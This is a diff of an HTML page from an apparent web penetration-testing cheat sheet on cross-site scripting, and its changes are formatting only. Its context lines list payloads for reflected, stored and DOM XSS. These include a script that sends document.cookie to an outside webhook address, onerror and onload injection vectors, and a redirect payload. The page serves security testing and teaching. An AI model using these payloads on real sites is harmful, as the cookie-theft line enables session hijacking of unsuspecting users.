@@ -33,7 +33,6 @@
 <button onclick="document.location='/machete/offensive/web_penetration_testing/client_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
 <details>
 <summary>GENERAL TECHNIQUES</summary>
-
 <b>C1: </b><mark id="GT01">&lt;script&gt;var i = new Image;i.src="LISTENER URL/?"+document.cookie;&lt;/script&gt;</mark>
 
 <b>SAMPLE: </b><mark>&lt;script&gt;var i = new Image;i.src="https://webhook.site/#!/d88f22e7-9e44-47e8-9508-edeb3406d1cd/?"+document.cookie;&lt;/script&gt;</mark>
@@ -45,9 +44,9 @@
 </details>	
 <details>
 <summary>REFLECTED TECHNIQUES</summary>
-<p><b>DESCRIPTION:</b> It is when data is retrieved in the webpage without any restriction. So it can be used to exfiltrate information, 
+<b>DESCRIPTION:</b> It is when data is retrieved in the webpage without any restriction. So it can be used to exfiltrate information, 
 stole information, etc.
-<p><b>GENERAL TECHNIQUES</b>
+<b>GENERAL TECHNIQUES</b>
 
 <b>COMMON TESTS: </b>	
 	
@@ -68,24 +67,22 @@ stole information, etc.
 
 <b>C1: </b><mark id="GT02">"onmouseover="alert(1)</mark>
 
-<b>NOTE: </b>As soon as you move the mouse over the vulnerable tag, it will pop-up the alert function. General inspection
-it's needed, manual review of behavior of input fields. If it is showing input data, how it behaves, what can he imported, etc.
+<b>NOTE: </b>As soon as you move the mouse over the vulnerable tag, it will pop-up the alert function. General inspection it's needed, 
+manual review of behavior of input fields. If it is showing input data, how it behaves, what can he imported, etc.
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#GT02')">.C1.</button>
 
 <b>::: INTO AN JAVASCRIPT STRING</b>
 
-<b>NOTE:</b> Headers inspection is needed, [burpsuite > repeater]. Analyze the code and what it is doing, if it is receiving
-via parameters some payloads can be used to escape. 
+<b>NOTE:</b> Headers inspection is needed, [burpsuite > repeater]. Analyze the code and what it is doing, if it is receiving via 
+parameters some payloads can be used to escape. 
 	
 <b>C1: </b><mark id="FGT01">'-alert(1)-'</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#FGT01')">.C1.</button>
 	
-</p>
 <details>
 <summary>TEST VIA DEV TOOLS</summary>
-
 1. Open dev-tools in your browser > go to console.
 2. Type: <mark id="TDT01">alert(1)</mark> | <mark id="TDT02">print()</mark> | <mark id="TDT03">prompt("hello")</mark>
 
@@ -103,8 +100,8 @@ via parameters some payloads can be used to escape.
 </details>
 <details>
 <summary>STORED TECHNIQUES</summary>
-<p><b>DESCRIPTION: </b>It is when data (exploit) is stored in the webpage without any restriction. So it can be used to exploit any 
-user that loads the vulnerable page.
+<b>DESCRIPTION: </b>It is when data (exploit) is stored in the webpage without any restriction. So it can be used to exploit any user 
+that loads the vulnerable page.
 
 <b>NOTE:</b>
 	
@@ -123,7 +120,6 @@ user that loads the vulnerable page.
 <summary>DOM TECHNIQUES</summary>
 <details>
 <summary>NORMAL TESTS</summary>
-
 1. <mark id="TDT06">&lt;img src=x onerror="prompt(1)"&gt;</mark>
 2. <mark id="TDT07">&lt;img src=x onerror="window.location.href="https://machetevault.github.io/machete""&gt;</mark>
 3. <mark id="TDT08">&lt;svg onload=alert(1)&gt;</mark> | DOM for <u>document.write</u>
@@ -155,7 +151,6 @@ IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) / Database / location</b>
 
 <details>
 <summary>DOM jQUERY SINKS</summary>	
-
 1. Inspect the webpage, first identify if exist JS, JQuery code and how it behaves.
 2. Try to attempt different tests.
 
@@ -168,9 +163,8 @@ IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) / Database / location</b>
 </details>	
 <details>
 <summary>DOM INSIDE "SELECT" STATEMENT</summary>	
-
-<b>NOTE: </b>It is needed to use the application as normal to later analyze the headers as it is really important to understand
-how it works. May exist some parameters that are hidden, etc. Test and looks how it behave. Inspect HTML code.
+<b>NOTE: </b>It is needed to use the application as normal to later analyze the headers as it is really important to understand how 
+it works. May exist some parameters that are hidden, etc. Test and looks how it behave. Inspect HTML code.
 
 <b>sink:document.write / source:location.search</b>
 
@@ -186,7 +180,6 @@ To be added...
 </details>
 <details>
 <summary>REFLECTED DOM</summary>	
-
 <b>NOTES:</b> 
 	
 1. It is required to use the application as normal user and analyze headers, behavior, etc. 
@@ -203,7 +196,6 @@ To be added...
 </details>	
 <details>
 <summary>STORED DOM</summary>	
-
 <b>NOTES:</b> 
 
 1. It is required to use the application as normal user and analyze headers, behavior, etc.
